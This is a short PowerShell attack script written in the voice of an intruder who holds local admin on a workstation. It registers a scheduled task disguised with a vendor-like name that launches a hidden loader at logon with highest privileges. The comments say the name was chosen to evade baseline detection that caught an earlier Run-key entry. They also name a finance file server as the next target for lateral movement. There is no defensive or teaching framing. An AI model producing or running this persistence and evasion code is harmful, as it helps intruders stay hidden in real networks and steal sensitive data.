# Persistence phase. I have local admin on this workstation now and I need to survive a
# reboot. I will register a scheduled task with a name that matches the vendor's own
# maintenance tasks, because the previous Run-key entry I used on the last host was found by
# their baseline comparison within a day. The task launches my loader at logon.
$a = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w hidden -File C:\ProgramData\Vendor\maint.ps1"
$t = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -TaskName "Vendor Maintenance Check" -Action $a -Trigger $t -RunLevel Highest
# Verifying the task registered before I move laterally; the next target is the file server
# because it holds the finance share, which is the highest-value data on this network.
Get-ScheduledTask -TaskName "Vendor Maintenance Check"
